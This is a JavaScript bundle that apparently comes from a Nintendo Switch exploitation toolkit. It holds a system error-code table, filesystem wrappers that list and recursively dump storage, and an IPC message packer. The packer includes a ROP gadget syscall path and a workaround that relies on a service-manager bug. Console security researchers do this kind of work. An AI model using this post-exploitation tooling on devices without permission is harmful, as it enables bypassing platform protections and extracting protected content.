	'0x2F5A02  6061  Offset outside storage',
	'0x313802  6300  Operation not supported',
	'0x320002  6400  Permission denied',
	'0x326602  6451  Missing titlekey(?) required to mount content',
	'0x3EA03  501  Invalid handle',
	'0x3EE03  503  Invalid memory mirror',
	"0xA05  5  NcaID not found. Returned when attempting to mount titles which exist that aren't *8XX titles, the same way *8XX titles are mounted.",
	'0xE05  7  TitleId not found',
	'0x1805  12  Invalid StorageId',
	'0xDC05  110  Gamecard not inserted',
	'0x17C05  190  Gamecard not initialized',
	'0x1F405  250  Sdcard not inserted',
	'0x20805  260  Storage not mounted',
	'0x408  2  Not initialized.',
	'0x608  3  Invalid control StorageID.',
	'0x808  4  Storage not found.',
	'0xA08  5  Access denied',
	'0xE08  7  Title is not registered.',
	'0x409  2  Maximum processes loaded.',
	'0x6609  51  Invalid memory state/permission',
	'0x6A09  53  Invalid NRR',
	'0xA209  81  Unaligned NRR address',
	'0xA409  82  Bad NRR size',
	'0xAA09  85  Bad NRR address',
	"0x1A80A  212  Bad magic (expected 'SFCO')",
	'0x20B  1  Size too big to fit to marshal.',
	'0x11A0B  141  Went past maximum during marshalling.',
	"0x1900B  200  Session doesn't support domains.",
	'0x25A0B  301  Remote process is dead.',
	'0x3D60B  491  IPC Query 1 failed.',
	'0x20F  1  Pid not found',
	'0x60F  3  Process has no pending events',
	'0x410  2  Title-id not found',
	'0xF010  120  Gamecard sysupdate not required',
	'0x1F610  251  Unexpected StorageId',
	'0x415  2  Not initialized.',
	'0x615  3  Max sessions',
	'0xC15  6  Invalid name (all zeroes)',
	'0x1015  8  Permission denied',
	'0x416  2  Address space is full',
	'0x616  3  NRO already loaded',
	'0x816  4  Invalid NRO header values',
	'0xC16  6  Bad NRR magic',
	'0x1016  8  Reached max NRR count',
	'0x1216  9  Unable to verify NRO hash or NRR signature',
	'0x80216  1025  Address not page-aligned',
	'0x80416  1026  Incorrect NRO size',
	'0x80816  1028  NRO not loaded',
	'0x80A16  1029  NRR not loaded',
	'0x80C16  1030  Already initialized',
	'0x80E16  1031  Not initialized',
	'0x41A  2  Argument is invalid',
	'0xD01A  104  All AES engines busy',
	'0xD21A  105  Invalid AES engine-id',
	'0x272  1  Invalid AppletResourceUserId',
	'0xCC74  102  Time not set',
	'0x287C  20  Argument is NULL',
	'0x2C7C  22  Argument is invalid',
	'0x3C7C  30  Bad input buffer size',
	'0x407C  32  Invalid input buffer',
	'0x3C9D  30  Address is NULL',
	'0x3E9D  31  PID is NULL',
	'0x549D  42  Already bound',
	'0xCC9D  102  Invalid PID',
	'0x3CF089  7800  Unknown/invalid libcurl error.'];

codestrs.forEach((codestr) => {
	var match;
	if ((match = /^(0x[A-Fa-f0-9]+)\s+[0-9]+\s+(.+)$/gm.exec(codestr)) !== null) {
		var code = parseInt(match[1], 16);
		var descStr = match[2];
		codes[code] = descStr;
	}
});

},{}],6:[function(require,module,exports){
/* eslint no-redeclare: "off" */

var utils = require('../utils');

function IDirectory (sc, path, handle, fs) {
	this.sc = sc;
	this.fs = fs;
	this.handle = handle;
	this.path = path;
}

IDirectory.prototype.GetEntryCount = function () {
	return this.sc.ipcMsg(1).sendTo(this.handle).asResult().map((r) => [r.dataBuffer[0], r.dataBuffer[1]]);
};

IDirectory.prototype.GetEntries = function (buf, numEntries) {
	if(buf.byteLength < 0x310 * numEntries) {
		throw new Error("buffer too small");
	}
	return this.sc.ipcMsg(0).data(0).bDescriptor(buf, 0x310 * numEntries, 0).sendTo(this.handle).asResult();
};

IDirectory.prototype.DirList = function (indentation) {
	var s = '';

	if (indentation !== undefined) {
		for (var i = 0; i < indentation; i++) {
			s += '   ';
		}
	}

	var entryCount = utils.trunc32(this.GetEntryCount().assertOk());

	if (entryCount > 0) {
		var entryBuf = new Uint32Array(0x310 * entryCount);
		this.GetEntries(entryBuf, entryCount).assertOk();
		for (i = 0; i < entryCount; i++) {
			var fn = this.path + utils.u8a2str(new Uint8Array(entryBuf.buffer, 0x310 * i, 0x300));
			var eType = entryBuf[(0x310 * i + 0x304) >> 2];
			if (eType === 1) {
				utils.log(s + '<FILE> ' + fn);
			} else {
				utils.log(s + '<FOLDER> ' + fn + '/');
				var f = this.fs.OpenDir(fn + '/').assertOk();
				try {
					f.DirList(indentation + 1);
				} finally {
					f.Close();
				}
			}
		}
	}
};

IDirectory.prototype.DirDump = function (dumpPath) {
	var entryCount = utils.trunc32(this.GetEntryCount().assertOk());
	if (entryCount > 0) {
		var entryBuf = new Uint32Array(0x310 * entryCount);
		this.GetEntries(entryBuf, entryCount).assertOk();
		for (var i = 0; i < entryCount; i++) {
			var fn = this.path + utils.u8a2nullstr(new Uint8Array(entryBuf.buffer, 0x310 * i, 0x300));
			var eType = entryBuf[(0x310 * i + 0x304) >> 2];
			if (eType === 1) {
				utils.log('<FILE> ' + fn);
				var fp = this.fs.OpenFile(fn).assertOk();
				try {
					var buf = fp.ReadAll().assertOk();
					this.sc.memdump(buf, fp.GetSize().assertOk(), dumpPath + fn);
				} finally {
					fp.Close();
				}
			} else {
				utils.log('<FOLDER> ' + fn + '/');
				var f = this.fs.OpenDir(fn + '/').assertOk();
				try {
					f.DirDump(dumpPath);
				} finally {
					f.Close();
				}
			}
		}
	}
};

IDirectory.prototype.Close = function () {
	return this.sc.svcCloseHandle(this.handle);
};

module.exports = IDirectory;

},{"../utils":20}],7:[function(require,module,exports){
var utils = require('../utils');

function IFile (sc, handle) {
	this.sc = sc;
	this.handle = handle;
}

IFile.prototype.Read = function (buffer, offset, length) {
	if(offset === undefined) {
		offset = [0, 0];
	}
	if(length === undefined) {
		length = buffer.byteLength;
	}
	return this.sc.ipcMsg(0).datau64(0, offset, length).bDescriptor(buffer, length, 1).sendTo(this.handle).asResult().replaceValue(buffer);
};

IFile.prototype.Write = function (offset, buf, size) {
	return this.sc.ipcMsg(1).aDescriptor(buf, size, 1).datau64(0, offset, size).sendTo(this.handle).asResult();
};

IFile.prototype.Flush = function() {
	return this.sc.ipcMsg(2).sendTo(this.handle).asResult();
};

IFile.prototype.SetSize = function (size) {
	return this.sc.ipcMsg(3).datau64(size).sendTo(this.handle).asResult();
};

IFile.prototype.GetSize = function () {
	return this.sc.ipcMsg(4).sendTo(this.handle).asResult()
		.map((r) => [r.data[0], r.data[1]]);
};

IFile.prototype.ReadAll = function () {
	var self = this;
	return this.GetSize().andThen((size) => {
		var fSize = utils.trunc32(size);
		var m = new ArrayBuffer(fSize);
		return self.sc.ipcMsg(0).datau64(0, 0, fSize).bDescriptor(m, fSize, 1).sendTo(self.handle).asResult().replaceValue(m);
	});
};

IFile.prototype.Close = function () {
	return this.sc.svcCloseHandle(this.handle);
};

// for SploitCore.prototype.dumpToFile
IFile.prototype.makeReader = function() {
	var f = this;
	return (ab, offset, size) => {
		return f.Read(ab, offset, size);
	};
};

module.exports = IFile;

},{"../utils":20}],8:[function(require,module,exports){
var utils = require('../utils');
var Result = require('../Result');

function IFileSystem (sc, handle) {
	this.sc = sc;
	this.handle = handle;
}

IFileSystem.prototype.OpenDir = function (dir, flags) {
	if (flags === undefined) { flags = 3; }
	var path = utils.str2ab(dir);
	var self = this;
	return this.sc.ipcMsg(9).datau64(flags).xDescriptor(path, path.byteLength, 0).sendTo(this.handle).asResult()
		.map((r) => new self.sc.IDirectory(self.sc, dir, r.movedHandles[0], self));
};

IFileSystem.prototype.CreateFile = function (path, size) {
	if (size === undefined) {
		size = 0x100;
	}
	var pbuf = utils.str2ab(path);
	var res = this.sc.ipcMsg(0).datau64(0, size).xDescriptor(pbuf, pbuf.byteLength, 0).sendTo(this.handle);
	return res.asResult();
};

IFileSystem.prototype.CreateDir = function (dir) {
	var path = utils.str2ab(dir);
	return this.sc.ipcMsg(2).xDescriptor(path, path.byteLength, 0).sendTo(this.handle).asResult();
};

IFileSystem.prototype.CreateDirectory = IFileSystem.prototype.CreateDir;

IFileSystem.prototype.OpenFileWithMode = function (path, mode) {
	var pbuf = utils.str2ab(path);
	var self = this;
	return this.sc.ipcMsg(8).datau32(mode).xDescriptor(pbuf, pbuf.byteLength, 0).sendTo(this.handle)
		.asResult()
		.map((r) => new self.sc.IFile(self.sc, r.movedHandles[0]));
};

IFileSystem.prototype.OpenFile = function (path) {
	var self = this;
	return self.OpenFileWithMode(path, 3);
};

IFileSystem.prototype.OpenReadFile = function (path) {
	var self = this;
	return self.OpenFileWithMode(path, 1);
};

IFileSystem.prototype.Commit = function () {
	return sc.ipcMsg(10).sendTo(this.handle).asResult();
};

IFileSystem.prototype.Close = function () {
	return this.sc.svcCloseHandle(this.handle);
};

IFileSystem.prototype.DeleteFile = function (path) {
	var pbuf = utils.str2ab(path);
	var res = this.sc.ipcMsg(1).datau64(0).xDescriptor(pbuf, pbuf.byteLength, 0).sendTo(this.handle);
	return res.asResult();
};

IFileSystem.prototype.DeleteDir = function (dir, recursive) {
	if (recursive === undefined) { recursive = false; }
	var path = utils.str2ab(dir);
	return this.sc.ipcMsg(recursive ? 4 : 3).xDescriptor(path, path.byteLength, 0).sendTo(this.handle).asResult();
};

IFileSystem.prototype.DumpBufferToNewFile = function (path, buffer, size) {
	var self = this;
	self.DeleteFile(path);
	return self.CreateFile(path, size).andThen(r => {
		var pbuf = utils.str2ab(path);
		return self.sc.ipcMsg(8).datau32(2).xDescriptor(pbuf, pbuf.byteLength, 0).sendTo(self.handle)
			.asResult()
			.map((r) => {
				var f = new self.sc.IFile(self.sc, r.movedHandles[0]);
				return f.Write(0, buffer, size);
			});
	});
};

module.exports = IFileSystem;

},{"../Result":4,"../utils":20}],9:[function(require,module,exports){
var utils = require("../utils");
var Result = require("../Result");

function IStorage (sc, handle) {
	this.sc = sc;
	this.handle = handle;
}

IStorage.prototype.Read = function(buffer, offset, length) {
	return this.sc.ipcMsg(0).datau64(offset, length)
		.bDescriptor(buffer, buffer.byteLength, 1)
		.sendTo(this.handle)
		.asResult();
}

IStorage.prototype.GetSize = function() {
	return this.sc.ipcMsg(4).sendTo(this.handle).asResult()
		.map((r) => utils.pad64(r.data));
};

// for SploitCore.prototype.dumpToFile
IStorage.prototype.makeReader = function() {
	var s = this;
	return (ab, offset, size) => {
		return s.Read(ab, offset, size);
	};
};

module.exports = IStorage;

},{"../Result":4,"../utils":20}],10:[function(require,module,exports){
/* eslint camelcase: "off" */
/* eslint no-redeclare: "off" */
var sploitcore = require('./sploitcore');
var sploitMixin = require('./sploitMixin');
var svcMixin = require('./svc');
var utils = require('./utils');
var ResultCode = require('./ResultCode');
var Result = require('./Result');

function IPCMessage (sc, sender, cmdId) {
	this.sc = sc;
	this.sender = sender;
	this.pid = null;
	this.type = 4;
	this.cmdId = cmdId;
	this.resultCode = cmdId;
	this.success = this.resultCode === 0 || this.resultCode === undefined;
	this.dataBuffer = [];
	this.aDescriptors = [];
	this.bDescriptors = [];
	this.cDescriptors = [];
	this.xDescriptors = [];
	this.copiedHandles = [];
	this.movedHandles = [];
	this.objectDomainCommand = undefined;
	this.objectId = 0;
	this.inputObjectIds = [];
	this.copyBuffers = [];
}

IPCMessage.prototype.setType = function (t) {
	this.type = t;
	return this;
};

IPCMessage.prototype.sendPid = function () {
	this.pid = true;
	return this;
};

IPCMessage.prototype.setCmd = function (cmdId) {
	this.cmdId = cmdId;
	this.resultCode = cmdId;
	return this;
};

IPCMessage.prototype.setResult = function (rescode) {
	this.setCmd(rescode);
	this.success = this.resultCode === 0;
};

IPCMessage.prototype.data = function () {
	this.dataBuffer = [];
	for (var i = 0; i < arguments.length; i++) {
		var v = arguments[i];
		if (v instanceof Array) {
			this.dataBuffer.push(v[0]);
			this.dataBuffer.push(v[1]);
		} else if(typeof(v) === "number") {
			this.dataBuffer.push(v);
			this.dataBuffer.push(0);
		} else {
			throw new Error("can't put in an IPC request: " + v);
		}
	}

	return this;
};

IPCMessage.prototype.datau32 = function () {
	this.dataBuffer = [];
	for (var i = 0; i < arguments.length; i++) {
		this.dataBuffer.push(utils.trunc32(arguments[i]));
	}
	return this;
};

IPCMessage.prototype.datau64 = function () {
	this.dataBuffer = [];
	for (var i = 0; i < arguments.length; i++) {
		var v = utils.pad64(arguments[i]);
		this.dataBuffer.push(v[0]);
		this.dataBuffer.push(v[1]);
	}

	return this;
};

IPCMessage.prototype.dataArrayBuffer = function(ab) {
	this.dataBuffer = [];
	var u32 = new Uint32Array(ab);
	for(var i = 0; i < u32.length; i++) {
		this.dataBuffer[i] = u32[i];
	}

	return this;
};

IPCMessage.prototype.addDescriptor = function (da, addr, size, third) {
	if (addr instanceof ArrayBuffer || ArrayBuffer.isView(addr)) {
		var buf = addr;
		if (size === undefined) {
			size = buf.byteLength;
		}
		if (this.sender.isBrowser) {
			if (buf.addr === undefined) {
				buf.addr = this.sc.getArrayBufferAddr(buf);
			}
			addr = buf.addr;
		} else {
			addr = this.sender.malloc(size);
			this.copyBuffers.push({
				addr, buf, size
			});
		}
	}
	addr = utils.pad64(addr);
	size = utils.pad64(size);
	if (third !== undefined) { da.push([addr, size, third]); } else { da.push([addr, size]); }
	return this;
};

IPCMessage.prototype.aDescriptor = function (addr, size, perm) {
	return this.addDescriptor(this.aDescriptors, addr, size, perm);
};

IPCMessage.prototype.bDescriptor = function (addr, size, perm) {
	return this.addDescriptor(this.bDescriptors, addr, size, perm);
};

/*
	type 0xA buffers have u16 length shenanigans
 */
IPCMessage.prototype.cDescriptor = function (addr, size, hasU16Length) {
	return this.addDescriptor(this.cDescriptors, addr, size, hasU16Length);
};

IPCMessage.prototype.xDescriptor = function (addr, size, counter) {
	return this.addDescriptor(this.xDescriptors, addr, size, counter);
};

IPCMessage.prototype.copyHandle = function (handle) {
	this.copiedHandles.push(utils.trunc32(handle));
	return this;
};

IPCMessage.prototype.moveHandle = function (handle) {
	this.movedHandles.push(utils.trunc32(handle));
	return this;
};

IPCMessage.prototype.inputObjectId = function (id) {
	this.inputObjectId.push(utils.trunc32(id));
	return this;
};

IPCMessage.prototype.toObject = function (object) {
	this.objectDomainCommand = 1;
	this.objectId = object;
	return this;
};

IPCMessage.prototype.closeObject = function (object) {
	this.objectDomainCommand = 2;
	this.objectId = object;
	return this;
};

IPCMessage.prototype.pack = function () {
	/*
    Structure of an IPC packet:
    2*u32 header
      type
      number of descriptors
      length of raw data section / 4
      "flags for buf c descriptors"
      enable handle descriptor
    x descriptors
    a descriptors
    b descriptors
    w descriptors
    raw data section
      padding
      aligned data section
      padding
      c descriptor lengths
    c descriptors
   */
	var alignedDataSection = [];
  
	var dataPayload = [];
	dataPayload.push(0x49434653);
	dataPayload.push(0);
	dataPayload.push(this.cmdId);
	dataPayload.push(0);
	for (var i = 0; i < this.dataBuffer.length; ++i) {
		dataPayload.push(this.dataBuffer[i]);
	}
  
	if (this.objectDomainCommand !== undefined) {
		alignedDataSection.push(this.objectDomainCommand | ((dataPayload.length * 4) << 16));
		alignedDataSection.push(this.objectId);
		alignedDataSection.push(0);
		alignedDataSection.push(0);
	}

	alignedDataSection = alignedDataSection.concat(dataPayload);

	var cDescriptorSection = [];
	for (var i = 0; i < this.cDescriptors.length; ++i) {
		var v = this.cDescriptors[i];
		var addr = utils.trunclt64(v[0], 48);
		var size = utils.trunclt32(v[1], 16);
		cDescriptorSection.push(addr[0]);
		cDescriptorSection.push((addr[1] & 0xFFFF) | (size << 16));
	}

	var cDescriptorsWithU16Length = this.cDescriptors.filter((c) => c[2]);
	var u16Lengths = cDescriptorsWithU16Length.map((c) => c[1][0]);
	if(u16Lengths.length % 2 > 0) {
		u16Lengths.push(0);
	}
	var cDescriptorLengthsSection = Array.from(new Uint32Array(new Uint16Array(u16Lengths).buffer));
  
	var descriptorSection = [];

	// handle descriptor
	if (this.pid || this.movedHandles.length > 0 || this.copiedHandles.length > 0) {
		descriptorSection.push((this.pid ? 1 : 0) | (this.copiedHandles.length << 1) | (this.movedHandles.length << 5)); // Handle descriptor
		if (this.pid) {
			descriptorSection.push(0);
			descriptorSection.push(0);
		}
		for (var i = 0; i < this.copiedHandles.length; ++i) { descriptorSection.push(this.copiedHandles[i]); }
		for (var i = 0; i < this.movedHandles.length; ++i) { descriptorSection.push(this.movedHandles[i]); }
	}

	// x descriptors
	for (var i = 0; i < this.xDescriptors.length; ++i) {
		var v = this.xDescriptors[i];
		var addr = v[0];
		var size = utils.trunc32(v[1]);
		var counter = v[2];
		descriptorSection.push(
			(counter & 0x3F) |
			(((addr[1] & 0x70) >>> 4) << 6) |
			(counter & 0xE00) |
			((addr[1] & 0xF) << 12) |
			size << 16
		);
		descriptorSection.push(addr[0]);
	}

	// a & b descriptors
	for (var i = 0; i < this.aDescriptors.length + this.bDescriptors.length; ++i) {
		var v = i < this.aDescriptors.length ? this.aDescriptors[i] : this.bDescriptors[i - this.aDescriptors.length];
		var addr = v[0];
		var size = utils.pad64(v[1]);
		var perm = v[2];
		descriptorSection.push(size[0]);
		descriptorSection.push(addr[0]);
		descriptorSection.push(
			perm |
			(((addr[1] & 0x70) >>> 4) << 2) |
			((size[1] & 0xF) << 24) |
			((addr[1] & 0xF) << 28)
		);
	}

	var rawDataSection = [];
	var rawDataOffset = 2 + descriptorSection.length; // 2 header bytes + descriptors
	while (((rawDataSection.length + rawDataOffset) & 3) !== 0) { rawDataSection.push(0); } // padding
	var paddingLength = rawDataSection.length;
	rawDataSection = rawDataSection.concat(alignedDataSection);
	for (var i = 0; i < 4-paddingLength; ++i) { rawDataSection.push(0); } // 0x10 bytes total padding
	rawDataSection = rawDataSection.concat(cDescriptorLengthsSection);

	var headerSection = [];
	headerSection.push(
		this.type | // Request
		(this.xDescriptors.length << 16) |
		(this.aDescriptors.length << 20) |
		(this.bDescriptors.length << 24) |
		(0 << 28) // W descriptors count
	);
	headerSection.push(
		(rawDataSection.length) |
		((this.cDescriptors.length !== 0 ? this.cDescriptors.length + 2 : 0) << 10) |
		(((this.pid || this.movedHandles.length > 0 || this.copiedHandles.length > 0) ? 1 : 0) << 31)
	);

	var buf = headerSection.concat(descriptorSection);
	buf = buf.concat(rawDataSection);
	buf = buf.concat(cDescriptorSection);
  
	for (var i = 0; i < buf.length; ++i) { buf[i] = buf[i] >>> 0; }

	return buf;
};

IPCMessage.prototype.sendTo = function (handleName) {
	var handle = handleName;
	if (!(handleName instanceof Array) && typeof(handleName) !== "number") {
		handle = this.sender.getAutoHandle(handleName);
	}

	if (this.packed === undefined) {
		this.packed = this.pack();
	}
	this.sc.ipcBuf.set(this.sc.emptyIpcBuf);
	this.sc.ipcBuf.set(this.packed);

	var self = this;

	if (this.sc !== this.sender) {
		this.sender.memcpyFromBrowser(this.sender.ipcBufAddr, this.sc.ipcBufAddr, 0x2000);
		this.copyBuffers.forEach((cr) => {
			self.sender.memcpyFromBrowser(cr.addr, cr.buf, cr.size);
		});
	}

	var ret = this.sender.svcSendSyncRequestWithUserBuffer(this.sender.ipcBufAddr, 0x2000, handle);

	if(!ret.isOk) {
		if (handle !== handleName) { // Remote port dead -- our handle is bad now
			this.sender.killAutoHandle(handleName);
		}
	}

	if (this.sc !== this.sender) {
		this.sender.memcpyToBrowser(this.sc.ipcBufAddr, this.sender.ipcBufAddr, 0x2000);
		this.copyBuffers.forEach((cr) => {
			self.sender.memcpyToBrowser(cr.buf, cr.addr, cr.size);
		});
	}

	if(ret.isOk) {
		return new IPCMessage(this.sc, this.sender).unpack(this.sc.ipcBuf, this.objectDomainCommand != null);
	} else {
		return new IPCFailure(this.sc, this.sender, ret.getError());
	}
};

IPCMessage.prototype.asyncSendTo = function (handleName, timeout) {
	if (this.sc !== this.sender) {
		throw new Error('asyncSendTo is only supported on sploitcore');
	}

	var handle = handleName;
	if (!(handle instanceof Array) && typeof(handle) !== "number") {
		// using auto handles with this asynchronous stuff would be a recipe for disaster
		handle = this.sc.getService(handleName);
	}

	if (this.packed === undefined) {
		this.packed = this.pack();
	}

	var ipcBuf = new Uint32Array(0x2000 >> 2);
	ipcBuf.set(this.packed);

	var self = this;
  
	return this.sc.asyncCaller.call(this.sc.gadget([0x41, 0x04, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6]), [this.sc.getArrayBufferAddr(ipcBuf), 0x2000, handle], timeout).then((ret) => {
		if (ret[0] === 0xf601 && handle !== handleName) {
			self.sc.svcCloseHandle(handle);
		}
		if (ret[0] !== 0) {
			return new IPCFailure(self.sc, self.sender, new ResultCode(ret));
		} else {
			return new IPCMessage(self.sc, self.sender).unpack(ipcBuf, this.objectDomainCommand != null);
		}
	});
};

IPCMessage.prototype.unpack = function (buf, toDomain) {
	this.buffer = buf;
	if(toDomain === undefined) { toDomain = false; }
  
	this.dataBuffer = this.data = [];
	this.aDescriptors = [];
	this.bDescriptors = [];
	this.cDescriptors = [];
	this.xDescriptors = [];
	this.copiedHandles = [];
	this.movedHandles = [];

	var xCount = (buf[0] >>> 16) & 0xF;
	var aCount = (buf[0] >>> 20) & 0xF;
	var bCount = (buf[0] >>> 24) & 0xF;
	var wCount = (buf[0] >>> 28);

	if (wCount > 0) {
		throw new Error("can't unpack W descriptors yet");
	}

	var rawDataSectionLength = (buf[1] & 0x3FF) * 4;
	var alignedDataSectionLength = rawDataSectionLength - 0x10;
	var cDescriptors = ((buf[1] >>> 10) & 0x3) - 1;
	var hasHandleDescriptor = (buf[1] >>> 31) === 1;

	var pos = 2;

	if (hasHandleDescriptor) {
		var hd = buf[pos++];
		var hasPid = !!(hd & 1);
		var copyCount = (hd >>> 1) & 0xF;
		var moveCount = hd >>> 5;
		if (hasPid) { this.pid = [buf[pos++], buf[pos++]]; }
		for (var i = 0; i < copyCount; ++i) { this.copiedHandles.push(buf[pos++]); }
		for (var i = 0; i < moveCount; ++i) { this.movedHandles.push(buf[pos++]); }
	}

	for (var i = 0; i < xCount; ++i) {
		var a = buf[pos++];
		var b = buf[pos++];
		var addr = [b, (((a >>> 12) & 0xF) | ((a >>> 2) & 0x70)) >>> 0];
		var size = [a >>> 16, 0];
		var counter = (a & 0xE3F) >>> 0;
		this.xDescriptors.push([addr, size, counter]);
	}

	for (var i = 0; i < aCount + bCount; ++i) {
		var a = buf[pos++];
		var b = buf[pos++];
		var c = buf[pos++];
		var addr = [b, ((((c >>> 2) << 4) & 0x70) | ((c >>> 28) & 0xF)) >>> 0];
		var size = [a, ((c >>> 24) & 0xF) >>> 0];
		var perm = c & 3;
		if (i < aCount) { this.aDescriptors.push([addr, size, perm]); } else { this.bDescriptors.push([addr, size, perm]); }
	}

	var rawDataSectionOffset = pos;
	// padding
	if ((pos & 3) !== 0) { pos += 4 - (pos & 3); }

	var dataPayloadLength = alignedDataSectionLength;
	if (toDomain) {

		this.objectDomainCommand = buf[pos] & 0xFF;

		if(this.objectDomainCommand === 2) {
			dataPayloadLength = 0;
		}

		var dataLength = (buf[pos++] >> 16) + 0x10;
		var inputObjectIdCount = (dataPayloadLength - dataLength - 0x10) / 4;
		dataPayloadLength = dataLength;

		this.objectId = buf[pos++];
		pos+= 2;
	}

	this.packed = Array.from(buf);
  
	if(dataPayloadLength > 0) {
		var dataPayloadBegin = pos;
    
		if ((buf[pos] & 0x00FFFFFF) !== 0x434653) {
			utils.hexdump("bad msg", buf, 0x50);
			throw new Error("SFCI/SFCO wasn't in expected position");
		}
    
		pos += 2;
		this.cmdId = this.resultCode = buf[pos];
		this.success = this.cmdId === 0;
		pos+= 2;
    
		while (pos < dataPayloadBegin + (dataPayloadLength >> 2)) {
			this.data.push(buf[pos++]);
		}
	}

	if (toDomain) {
		while (inputObjectIdCount > 0) {
			// TODO: the u32 are technically unaligned.
			this.inputObjectIds.push(buf[pos++]);
			inputObjectIdCount -= 1;
		}
	}

	pos = rawDataSectionOffset + (rawDataSectionLength >> 2);
  
	for(var i = 0; i < cDescriptors; i++) {
		var a = buf[pos++];
		var b = buf[pos++];
		var addr = [a, (b & 0xFFFF) >>> 0];
		var size = [b >>> 16, 0];
		this.cDescriptors.push([addr, size]);
	}
  
	return this;
};

IPCMessage.prototype.show = function () {
	utils.log('IPC message:');
	if (this.resultCode !== 0) { utils.log('- Command ID / Result code: ' + new ResultCode(this.resultCode).toString()); }
	if (this.pid !== null) { utils.log('- PID: ' + utils.paddr(this.pid)); }
	if (this.dataBuffer.length > 0) {
		utils.log('- Data');
		utils.hexdump("    data", new Uint32Array(this.dataBuffer));
	}
	if (this.copiedHandles.length > 0) {
		utils.log('- Copied handles');
		for (var i = 0; i < this.copiedHandles.length; ++i) { utils.log('    - 0x' + this.copiedHandles[i].toString(16)); }
	}
	if (this.movedHandles.length > 0) {
		utils.log('- Moved handles');
		for (var i = 0; i < this.movedHandles.length; ++i) { utils.log('    - 0x' + this.movedHandles[i].toString(16)); }
	}
	if (this.inputObjectIds.length > 0) {
		utils.log('- Input Objects');
		for (var i = 0; i < this.inputObjectIds.length; ++i) { utils.log('    - 0x' + this.inputObjectIds[i].toString(16)); }
	}
	if (this.aDescriptors.length > 0) { utils.log('- ' + this.aDescriptors.length + ' A descriptor' + (this.aDescriptors.length > 1 ? 's' : '')); }
	if (this.bDescriptors.length > 0) { utils.log('- ' + this.bDescriptors.length + ' B descriptor' + (this.bDescriptors.length > 1 ? 's' : '')); }
	if (this.cDescriptors.length > 0) { utils.log('- ' + this.cDescriptors.length + ' C descriptor' + (this.cDescriptors.length > 1 ? 's' : '')); }
	if (this.xDescriptors.length > 0) { utils.log('- ' + this.xDescriptors.length + ' X descriptor' + (this.xDescriptors.length > 1 ? 's' : '')); }

	return this;
};

IPCMessage.prototype.showPacked = function () {
	utils.hexdump("ipcm", this.pack());
	return this;
};

IPCMessage.prototype.toBuilderString = function () {
	function fmtU32Array(arr) {
		return arr.map((u32) => "0x" + u32.toString(16)).join(", ");
	}
  
	var str = "sc.ipcMsg(" + this.cmdId + ")";
	if(this.type !== 4) { str+= ".setType(" + this.type + ")"; }
	if(this.dataBuffer.length > 0) { str+= ".data(" + fmtU32Array(this.dataBuffer) + ")"; }
	this.aDescriptors.forEach((ad) => {
		str+= ".aDescriptor(" + fmtU32Array(ad) + ")";
	});
	this.bDescriptors.forEach((ad) => {
		str+= ".bDescriptor(" + fmtU32Array(ad) + ")";
	});
	this.cDescriptors.forEach((ad) => {
		str+= ".cDescriptor(" + fmtU32Array(ad) + ")";
	});
	this.xDescriptors.forEach((ad) => {
		str+= ".xDescriptor(" + fmtU32Array(ad) + ")";
	});
	this.copiedHandles.forEach((ch) => {
		str+= ".copyHandle(0x" + ch.toString(16) + ")";
	});
	this.movedHandles.forEach((ch) => {
		str+= ".moveHandle(0x" + ch.toString(16) + ")";
	});
	this.inputObjectIds.forEach((ch) => {
		str+= ".inputObjectId(0x" + ch.toString(16) + ")";
	});
	if(this.objectDomainCommand) {
		switch(this.objectDomainCommand) {
		case 1:
			str+= ".toObject(" + this.objectId + ")";
			break;
		case 2:
			str+= ".closeObject(" + this.objectId + ")";
			break;
		default:
			throw new Error("unknown domain command");
		}
	}
	return str;
};

IPCMessage.prototype.assertOk = function () {
	if(!this.success) {
		this.show();
		throw new ResultCode(this.resultCode);
	} else {
		return this;
	}
};

IPCMessage.prototype.asResult = function () {
	if(this.success) {
		return new Result.Ok(this);
	} else {
		return new Result.Err(this);
	}
};

// calls cb if our result code == 0, err otherwise
// cb signature is (msg, moved, copied) => { ... }
// returns value returned from cb
IPCMessage.prototype.withHandles = function(cb, err) {
	try {
		if(this.success) {
			return cb(this, this.movedHandles, this.copiedHandles);
		} else {
			if(err) {
				return err(this, this.movedHandles, this.copiedHandles);
			} else {
				return this;
			}
		}
	} finally {
		var sender = this.sender;
		this.movedHandles.forEach((mh) => {
			sender.svcCloseHandle(mh);
		});
		this.copiedHandles.forEach((ch) => {
			sender.svcCloseHandle(ch);
		});
	}
};

IPCMessage.prototype.toString = function() {
	return "IPCMessage(" + this.cmdId + " = " + new ResultCode(this.resultCode).toString() + ")";
};

function IPCFailure(sc, sender, resultCode) {
	this.resultCode = resultCode;
	this.sc = sc;
	this.sender = sender;
}

IPCFailure.prototype.assertOk = function () {
	this.show();
	throw this.resultCode;
};

IPCFailure.prototype.asResult = function () {
	return new Result.Err(this);
};

IPCFailure.prototype.withHandles = function(ok, err) {
	if(err) {
		return err(this, [], []);
	} else {
		return this;
	}
};

IPCFailure.prototype.show = function () {
	utils.log("IPC Failure: " + this.resultCode.message + ", offending request shown below");
	new IPCMessage(this.sc, this.sender).unpack(this.sc.ipcBuf, this.objectDomainCommand != null).show();
	return this;
};

IPCFailure.prototype.toString = function () {
	return "IPCFailure(" + this.resultCode.toString() + ")";
};

IPCFailure.prototype.success = false;
IPCFailure.prototype.isFailure = true;

sploitMixin.ipcMsg = function (cmdId) {
	return new IPCMessage(this.sc, this, cmdId);
};

/*
  If no `cb` is passed, return a Result.
    Ok(u32 handle) if everything is okay
    Err(ResultCode) if `sm:` returned an unsuccessful result code
    Throw if `name` is not a string, no such service exists, or we fail to connect to `sm:`
  If `cb` is passed:
    Calls `cb` with the `u32 handle` if successful. If we fail to get a handle, throw.
    Returns value returned from `cb` and automatically closes handle after `cb` returns.
 */
sploitMixin.getService = function (name, cb) {
	if (typeof(name) !== "string") {
		throw new Error("cannot get service with non-string name");
	}
	
	/* We can only query services if we have smhax. */
	if (utils.hasSmhax()) {
		if (!this.sc.hasService(name)) {
			throw new Error('no such service');
		}
	}

	if (this.smHandle === undefined) {
		this.smHandle = this.svcConnectToPort('sm:').assertOk();
		
		/* Without smhax we have to initialize sm. */
		if (!utils.hasSmhax()) {
			this.ipcMsg(0).sendPid().datau64(0).sendTo(this.smHandle).assertOk();
		}
	}
	var lol = utils.str2u64(name);
	var r = this.ipcMsg(1).datau64(lol).sendTo(this.smHandle).asResult().map((response) => response.movedHandles[0]);
	if(cb === undefined) {
		return r;
	} else {
		var h = r.assertOk();
		try {
			return cb(h);
		} finally {
			this.svcCloseHandle(h);
		}
